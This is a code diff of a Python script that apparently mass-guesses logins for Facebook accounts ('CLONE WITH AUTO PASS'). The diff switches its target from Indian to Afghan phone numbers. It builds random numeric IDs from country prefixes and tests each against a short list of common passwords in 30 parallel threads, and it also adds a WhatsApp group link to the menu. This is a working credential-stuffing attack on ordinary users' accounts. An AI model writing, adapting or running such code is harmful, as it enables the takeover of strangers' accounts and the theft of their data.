@@ -252,7 +252,7 @@ def FKING():
 			elif jf in ['2','02']:
 			 os.system('xdg-open https://www.facebook.com/profile.php?id=100090642414392/')
 			elif jf in ['3','03']:
-			 os.system('YT-Link')
+			 os.system('xdg-open https://chat.whatsapp.com/KZk9MHGy8YwJjEg8OpZjm9')
 			elif jf in ['0','00']:
 				exit(' Thanks for use 🥰 ')
 			else:
@@ -261,7 +261,7 @@ def FKING():
 				
 				
 								
-def IND():
+def AFG():
 		user=[]
 		clear()
 		print('\033[1;35m Code example: 9379,9378,9377,9370')
@@ -275,11 +275,11 @@ def IND():
 		linex()
 		mthd = input(' Choose: ')
 		clear()
-		print(' \n\033[1;32m [1] \033[1;33mCLONE WITH AUTO PASS (IND) ')
+		print(' \n\033[1;32m [1] \033[1;33mCLONE WITH AUTO PASS (AFG) ')
 		linex()
 		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
-			nmp = ''.join(random.choice(string.digits) for _ in range(6))
+			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
 		with tred(max_workers=30) as FKING:	
 			clear()
@@ -291,7 +291,7 @@ def IND():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'786786','59039200','57273200','57575751']
+					passlist = [psx,ids,'57273200','57575751,','59039200']
 					
 				if mthd in ['1','01']:
 					FKING.submit(fking1,ids,passlist)
